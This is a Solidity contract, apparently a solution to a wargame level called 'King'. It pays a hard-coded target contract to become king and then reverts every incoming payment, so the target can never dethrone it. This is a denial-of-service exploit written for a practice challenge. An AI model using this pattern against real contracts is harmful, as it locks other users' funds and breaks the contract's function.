// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IKing {
    function prize() external returns (uint256);
    function king() external returns (address);
}

contract solveKing {

    address kingAddr = 0x1BcA47599e5fB459088B8FE0FD60649aB556d658;

    IKing target = IKing(kingAddr);

    function takeOwnership() external payable {
        require(address(this).balance >= target.prize());
        kingAddr.call{value: msg.value}("");
    }

    receive() external payable { 
        revert();
    }

    function whoKing() public returns (address) {
        return target.king();   
    }

}